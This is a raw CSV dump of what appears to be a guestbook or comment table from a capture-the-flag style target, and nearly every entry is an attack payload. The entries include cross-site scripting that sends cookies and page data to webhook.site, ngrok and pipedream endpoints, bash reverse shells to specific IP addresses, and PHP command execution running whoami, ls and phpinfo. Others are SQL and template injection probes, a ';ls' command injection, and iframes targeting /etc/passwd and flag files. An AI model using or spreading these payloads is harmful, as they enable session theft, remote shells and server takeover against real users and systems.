id,name,entry
161,fd,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.domain)</script>"
162,fds,"<script>console.log(""Hey"")</script>"
163,fds,"<script>console.log(""Hey"")</script>"
164,fd,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.getElementsByClassName(\\'STAGING_COLUMN\\').text)</script>"
165,fds,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/82.12.44.94/7777 0>"
166, 1' + sleep(10), 1' + sleep(10)
167,1' + sleep(10),1' + sleep(10)
168,adf,<script>fetch('http://5e44-50-66-181-212.ngrok.io/c.png')</script>
169,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie;>"
170,a,<script>fetch('http://2b09-50-66-181-212.ngrok.io/c.png'+<?php echo(phpinfo());?>)</script>
171,a,<script>fetch('http://2b09-50-66-181-212.ngrok.io/c.png'+<?php echo(phpinfo());?>)</script>
172,a,"<script><?php echo ""<?php file_put_contents(\\'nameOfFile\\', fopen(\\'http://192.168.1.102/file\\', \\'r\\')); ?>"" > down2.php;></script>"
173,b,; bash -i >& /dev/tcp/3.129.187.220/14270 0>&1
174,fd,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/3.129.187.220/14270 0>"
175,a,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?>"
176,d,<?php echo(phpinfo());?>
177,a,<script><?php echo(phpinfo());?></script>
178,a,<script><?php echo(phpinfo());?></script>
179,a,"<script><?php echo(""test"");?></script>"
180,a,"<script><?php echo(""test"");?></script>"
181,f,"<script>console.log(""Hey"")</script>"
182,f,"<script>console.log(""Hey"")</script>"
183,a,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
184,test,'
185,test,"\\'""><img src=x onerror=alert(1);>"
186,test,"<?php echo(system(""ls"")); ?>"
187,test,"""><?php echo(system(""ls"")); ?>"
188,test,"""><img src=x onerror=alert(document.cookie);>"
189,test,"""><img src=flag.txt onerror=alert(document.cookie);>"
190,test,"""><img src=x onerror=alert(document.cookie);>"
191,person,i'm a person
192,' or True,<blank>
193,' or True,<blank>
194,<blank>,' or True /*
195,whoami'--!,<blank>
196,test,test
197,aa,"""><img src=x onerror=alert(document.cookie);>"
198,aa,"""><img src=x onerror=alert(document.cookie);>"
199,whoami'--!,<blank>
200,"<?php echo(system(""ls"")); ?>",<blank>
201,<blank>,"<?php echo(system(""ls"")); ?>"
202,"""><?php echo(system(""ls"")); ?>","""><?php echo(system(""ls"")); ?>"
203,"""><?php echo(system(""ls"")); ?>","""><?php echo(system(""ls"")); ?>"
204,test,"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>"
205,s,<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
206,Admin,&lt;iframe src=/flag.php&gt;
207,<blank>,"<script>console.log(""Hey"")</script>"
208,<blank>,<iframe src=/flag.php>
209,<blank>,<iframe src=/flag.php>
210,<blank>,<iframe src=/flag.txt>
211,<blank>,<iframe src=/etc/passwd>
212,<blank>,<iframe src=/login.php>
213,<blank>,<iframe src=/guessbook.php>
214,<blank>,<iframe src=/127.0.0.1>
215,<blank>,<iframe src=/127.0.0.1>
216,<blank>,<iframe src=/referral.php>
217,<blank>,<iframe src=/referral.phps>
218,<blank>,<iframe src=/flag.php>
219,<blank>,"<script type=""text/javascript"">document.location=""https://hookb.in/JK0waGPy30hg0l990W7G?c"" document.cookie;</script>"
220,<blank>,<iframe src=/etc/passwd> 
221,aaaaa,aaaa
222,<blank>,"<?php system(""whoami""); ?>"
223,Admin,"<script type=""text/javascript""> document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c=""+document.cookie; </script>"
224,<blank>,"<<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
225,<blank>,"<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
226,<blank>,{{1**3}}
227,<blank>,;ls
228,<blank>,"<script>alert(""1"")</script>"
229,<blank>,"<script>alert(""1"");</script>"
230,<blank>,<%= %>
231,<blank>,${7*7}
232,<blank>,<%= 7*7 %>
233,<blank>,{{7*7}}
234,<blank>,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?> "
235,<blank>,"<script type=""text/javascript""> document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c=""+document.cookie; </script>"
236,<blank>,<blank>
237,<blank>,"<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
238,<blank>,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?> "
239,<blank>,<?php echo `whoami`?> 

